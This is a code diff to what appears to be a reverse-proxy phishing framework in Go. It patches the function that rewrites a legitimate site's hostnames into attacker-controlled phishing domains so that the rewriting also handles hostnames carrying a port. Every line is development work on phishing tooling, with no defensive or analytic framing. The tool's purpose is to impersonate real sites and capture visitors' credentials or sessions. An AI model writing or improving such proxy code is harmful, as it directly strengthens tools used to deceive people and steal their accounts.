@@ -1731,31 +1731,39 @@ func (p *HttpProxy) replaceHostWithOriginal(hostname string) (string, bool) {
 }
 
 func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
-	if hostname == "" {
-		return hostname, false
-	}
-	prefix := ""
-	if hostname[0] == '.' {
-		prefix = "."
-		hostname = hostname[1:]
-	}
-	for site, pl := range p.cfg.phishlets {
-		if p.cfg.IsSiteEnabled(site) {
-			phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
-			if !ok {
-				continue
-			}
-			for _, ph := range pl.proxyHosts {
-				if hostname == combineHost(ph.orig_subdomain, ph.domain) {
-					return prefix + combineHost(ph.phish_subdomain, phishDomain), true
-				}
-				if hostname == ph.domain {
-					return prefix + phishDomain, true
-				}
-			}
-		}
-	}
-	return hostname, false
+        if hostname == "" {
+                return hostname, false
+        }
+        prefix := ""
+        if hostname[0] == '.' {
+                prefix = "."
+                hostname = hostname[1:]
+        }
+
+        // isolate an optional :port suffix so the lookups run on the bare host
+        port := ""
+        if idx := strings.LastIndex(hostname, ":"); idx != -1 {
+                port = hostname[idx:] // keeps the leading ":"
+                hostname = hostname[:idx]
+        }
+
+        for site, pl := range p.cfg.phishlets {
+                if p.cfg.IsSiteEnabled(site) {
+                        phishDomain, ok := p.cfg.GetSiteDomain(pl.Name)
+                        if !ok {
+                                continue
+                        }
+                        for _, ph := range pl.proxyHosts {
+                                if hostname == combineHost(ph.orig_subdomain, ph.domain) {
+                                        return prefix + combineHost(ph.phish_subdomain, phishDomain) + port, true
+                                }
+                                if hostname == ph.domain {
+                                        return prefix + phishDomain + port, true
+                                }
+                        }
+                }
+        }
+        return hostname + port, false
 }
 
 func (p *HttpProxy) replaceUrlWithPhished(u string) (string, bool) {
